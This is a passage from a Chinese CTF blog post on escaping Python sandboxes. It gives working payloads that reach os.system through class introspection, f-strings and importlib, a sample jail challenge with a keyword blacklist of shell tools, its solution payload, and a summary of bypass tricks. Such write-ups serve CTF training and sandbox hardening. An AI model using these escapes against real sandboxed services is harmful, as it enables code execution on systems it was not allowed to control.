<p>应对的方式就是将<code>[</code>和<code>]</code>的功能用<code>pop</code> 、<code>__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code> ）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&#x27;linecache&#x27;).os.popen(&#x27;whoami&#x27;).read())					#python2</span><br></pre></td></tr></table></figure>

<ul>
<li>利用新特性</li>
</ul>
<p>PEP 498 引入了 <code>f-string</code>，在 3.6 开始出现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式化字符串文字或f -string是前缀为&#x27;f&#x27;or的字符串文字&#x27;F&#x27;。这些字符串可能包含替换字段，它们是由花括号分隔的表达式&#123;&#125;。虽然其他字符串文字总是有一个常量值，但格式化字符串实际上是在运行时评估的表达式。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print( f&#x27;&#123;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<ul>
<li>序列化</li>
</ul>
<p>等更新吧</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>比赛的时候，遇到一个题目python2写的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line">from __future__ import print_function</span><br><span class="line">print(&quot;=========================&quot;)</span><br><span class="line">print(&quot;  WELCOME TO FOOBAR JAIL &quot;)</span><br><span class="line">print(&quot;=========================&quot;)</span><br><span class="line">blacklist = [</span><br><span class="line">    &quot;import&quot;,</span><br><span class="line">    &quot;exec&quot;,</span><br><span class="line">    &quot;eval&quot;,</span><br><span class="line">    &quot;os&quot;,</span><br><span class="line">    &quot;pickle&quot;,</span><br><span class="line">    &quot;subprocess&quot;,</span><br><span class="line">    &quot;input&quot;,</span><br><span class="line">    &quot;blacklist&quot;,</span><br><span class="line">    &quot;sys&quot;,</span><br><span class="line">    &quot;ls&quot;,</span><br><span class="line">    &quot;cat&quot;,</span><br><span class="line">    &quot;echo&quot;,</span><br><span class="line">    &quot;la&quot;,</span><br><span class="line">    &quot;flag&quot;,</span><br><span class="line">    &quot;tac&quot;,</span><br><span class="line">    &quot;grep&quot;,</span><br><span class="line">    &quot;find&quot;]</span><br><span class="line">builtin = __builtins__.__dict__.keys()</span><br><span class="line">builtin.remove(&#x27;raw_input&#x27;)</span><br><span class="line">builtin.remove(&#x27;print&#x27;)</span><br><span class="line">for modules in builtin:</span><br><span class="line">    del __builtins__.__dict__[modules]</span><br><span class="line">while 1 == 1:</span><br><span class="line">    try:</span><br><span class="line">        print(&quot;&gt;&gt;&gt;&quot;, end=&#x27; &#x27;)</span><br><span class="line">        val = raw_input()</span><br><span class="line">        for word in blacklist:</span><br><span class="line">            if word.lower() in val.lower():</span><br><span class="line">                print(&quot;Sorry!! You cannot use that here.&quot;)</span><br><span class="line">                break</span><br><span class="line">            else: </span><br><span class="line">                print(&quot;4566.&quot;)</span><br><span class="line">                exec val   </span><br><span class="line">    except:</span><br><span class="line">        print (&quot;What are you doing ? :(&quot;)</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;who&#x27;+&#x27;ami&#x27;))</span><br></pre></td></tr></table></figure>

<h2 id="攻击总结"><a href="#攻击总结" class="headerlink" title="攻击总结"></a>攻击总结</h2><p>1、注意题目为python2还是python3的环境，其对应的库会有很大的差距，但总体来说，python27有的，python3都有，但需要改变相应下标</p>
<p>2、曲径通幽，最终获得你想要的模块，认真找慢慢翻，比如从<code>().__class__.__bases__[0].__subclasses__()</code> 出发，查看可用的类</p>
<ul>
<li>若类中有file，考虑读写操作</li>
<li>若类中有&lt;class ‘warnings.WarningMessage’&gt;，考虑从<code>.__init__.func_globals.values()[13]</code>获取eval，map等等；又或者从<code>.__init__.func_globals[linecache]</code> 得到os</li>
<li>若类中有&lt;type ‘file’&gt;，&lt;class ‘ctypes.CDLL’&gt;，&lt;class ‘ctypes.LibraryLoader’&gt;，考虑构造so文件<br>其他的相关关键字可以搜索魔法函数，会对魔法函数有更多的理解</li>
</ul>
<p>3、分析ban函数的时候考虑使用字符串拼接结合<code>__getattribute__</code>绕过；当然也可以考虑加解密或者字符拼接来进行绕过</p>
<p>4、执行任意命令不仅仅只有os.system还有前面提到的多种方法</p>
<p>5、注意一种简单题型，出题者只做了如下一些处理：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#x27;__import__&#x27;] # __import__ is the function called by the import statement</span><br><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#x27;eval&#x27;] # evaluating code could be dangerous</span><br><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#x27;execfile&#x27;] # likewise for executing the contents of a file</span><br><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#x27;input&#x27;] # Getting user input and evaluating it might be dangerous</span><br></pre></td></tr></table></figure>

<p>看起来好像已经非常安全是么？但是，<code>reload(module)</code> 重新加载导入的模块，并执行代码。所以模块被导回到我们的命名空间。</p>
<p>6、模块导入方式有</p>
<ul>
<li>最直接的import.</li>
<li>内置函数 import</li>
<li>importlib库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line">importlib.import_module(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://0314valen.github.io">Valen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://0314valen.github.io/article/2022-03-09-python%E6%B2%99%E7%AE%B1/">https://0314valen.github.io/article/2022-03-09-python%E6%B2%99%E7%AE%B1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://0314valen.github.io" target="_blank">Valen的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/python/">python</a><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="social-share" data-image="https://img.paulzzh.tech/touhou/random" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/image/UI_images/alipay-reward-image.jpg" target="_blank"><img class="post-qr-code-img" src="/image/UI_images/alipay-reward-image.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/image/UI_images/alipay-reward-image.jpg" target="_blank"><img class="post-qr-code-img" src="/image/UI_images/alipay-reward-image.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/2022-03-10-buumisc(5)/"><img class="prev-cover" src="http://api.btstu.cn/sjbz/" onerror="onerror=null;src='/image/UI_images/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">buumisc(5)</div></div></a></div><div class="next-post pull-right"><a href="/article/2022-03-03-misc%E8%84%9A%E6%9C%AC%E5%90%88%E9%9B%86/"><img class="next-cover" src="http://api.btstu.cn/sjbz/" onerror="onerror=null;src='/image/UI_images/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">misc脚本</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/article/2022-03-03-misc%E8%84%9A%E6%9C%AC%E5%90%88%E9%9B%86/" title="misc脚本"><img class="cover" src="http://api.btstu.cn/sjbz/" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-03</div><div class="title">misc脚本</div></div></a></div><div><a href="/article/2021-08-24-python%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E5%AD%90%E5%9F%9F%E5%90%8D+%E9%82%AE%E7%AE%B1)/" title="python信息收集(子域名+邮箱)"><img class="cover" src="https://api.ixiaowai.cn/gqapi/gqapi.php" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-28</div><div class="title">python信息收集(子域名+邮箱)</div></div></a></div><div><a href="/article/2022-01-14-Ubuntu%E6%9B%B4%E6%96%B0python/" title="Ubuntu更新python"><img class="cover" src="https://img.paulzzh.tech/touhou/random" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-14</div><div class="title">Ubuntu更新python</div></div></a></div><div><a href="/article/2021-10-28-%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86%E8%B5%9B/" title="”红明谷“杯数据安全大赛-安全意识赛"><img class="cover" src="http://api.btstu.cn/sjbz/" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-28</div><div class="title">”红明谷“杯数据安全大赛-安全意识赛</div></div></a></div><div><a href="/article/2021-10-31-%E5%B8%B8%E7%94%A8%E6%96%87%E4%BB%B6%E5%A4%B4/" title="CTF比赛中常见的文件头"><img class="cover" src="http://api.btstu.cn/sjbz/" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-31</div><div class="title">CTF比赛中常见的文件头</div></div></a></div><div><a href="/article/2021-11-17-misc%E6%8A%80%E5%B7%A7/" title="misc技巧"><img class="cover" src="http://api.btstu.cn/sjbz/" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-17</div><div class="title">misc技巧</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/image/UI_images/avatar.jpg" onerror="this.onerror=null;this.src='/image/UI_images/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Valen</div><div class="author-info__description">一位精通各种环境的开启和附件的下载的签到型选手</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">1.</span> <span class="toc-text">Python沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E5%8C%BA%E5%88%AB"><span class="toc-number">1.1.1.</span> <span class="toc-text">版本区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#future%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.1.2.</span> <span class="toc-text">future语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E7%BB%86%E8%8A%82"><span class="toc-number">1.1.3.</span> <span class="toc-text">模块细节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E7%9A%84LEGB"><span class="toc-number">1.1.4.</span> <span class="toc-text">python的LEGB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.5.</span> <span class="toc-text">命令执行的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8A%B1%E9%87%8C%E8%83%A1%E5%93%A8%E7%9A%84%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.1.6.</span> <span class="toc-text">花里胡哨的姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8A%B1%E5%BC%8Fimport"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">花式import</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8A%B1%E5%BC%8F%E5%A4%84%E7%90%86%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.1.6.2.</span> <span class="toc-text">花式处理字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87sys-modules"><span class="toc-number">1.1.6.3.</span> <span class="toc-text">绕过sys.modules</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8A%B1%E5%BC%8F%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.6.4.</span> <span class="toc-text">花式执行函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E9%80%83%E9%80%B8"><span class="toc-number">1.1.6.5.</span> <span class="toc-text">继承关系逃逸</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.7.</span> <span class="toc-text">读写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.7.1.</span> <span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.7.2.</span> <span class="toc-text">写文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">1.1.8.</span> <span class="toc-text">补充</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.2.</span> <span class="toc-text">例题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">攻击总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/article/2022-11-15-Solidity8.0-%E5%85%A5%E9%97%A8/" title="Solidity8.0-入门"><img src="https://www.osgeo.cn/solidity/_static/logo.svg" onerror="this.onerror=null;this.src='/image/UI_images/404.jpg'" alt="Solidity8.0-入门"/></a><div class="content"><a class="title" href="/article/2022-11-15-Solidity8.0-%E5%85%A5%E9%97%A8/" title="Solidity8.0-入门">Solidity8.0-入门</a><time datetime="2022-11-14T16:00:00.000Z" title="发表于 2022-11-15 00:00:00">2022-11-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/article/2022-11-01-2022%E5%B9%B410%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/" title="2022年10月比赛writeups"><img src="http://api.btstu.cn/sjbz/" onerror="this.onerror=null;this.src='/image/UI_images/404.jpg'" alt="2022年10月比赛writeups"/></a><div class="content"><a class="title" href="/article/2022-11-01-2022%E5%B9%B410%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/" title="2022年10月比赛writeups">2022年10月比赛writeups</a><time datetime="2022-10-31T16:00:00.000Z" title="发表于 2022-11-01 00:00:00">2022-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/article/2022-10-01-2022%E5%B9%B49%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/" title="2022年9月比赛writeups"><img src="http://api.btstu.cn/sjbz/" onerror="this.onerror=null;this.src='/image/UI_images/404.jpg'" alt="2022年9月比赛writeups"/></a><div class="content"><a class="title" href="/article/2022-10-01-2022%E5%B9%B49%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/" title="2022年9月比赛writeups">2022年9月比赛writeups</a><time datetime="2022-09-30T16:00:00.000Z" title="发表于 2022-10-01 00:00:00">2022-10-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/article/2022-09-26-MySql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/" title="MySql数据库基础"><img src="https://imgsa.baidu.com/forum/pic/item/d52a2834349b033b40eff18517ce36d3d539bd0d.jpg" onerror="this.onerror=null;this.src='/image/UI_images/404.jpg'" alt="MySql数据库基础"/></a><div class="content"><a class="title" href="/article/2022-09-26-MySql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/" title="MySql数据库基础">MySql数据库基础</a><time datetime="2022-09-25T16:00:00.000Z" title="发表于 2022-09-26 00:00:00">2022-09-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/article/2021-11-23-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(ssti)/" title="模板注入(ssti)"><img src="https://img.paulzzh.tech/touhou/random" onerror="this.onerror=null;this.src='/image/UI_images/404.jpg'" alt="模板注入(ssti)"/></a><div class="content"><a class="title" href="/article/2021-11-23-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(ssti)/" title="模板注入(ssti)">模板注入(ssti)</a><time datetime="2022-09-08T08:39:16.859Z" title="发表于 2022-09-08 16:39:16">2022-09-08</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By Valen</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="富强,民主,文明,和谐,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>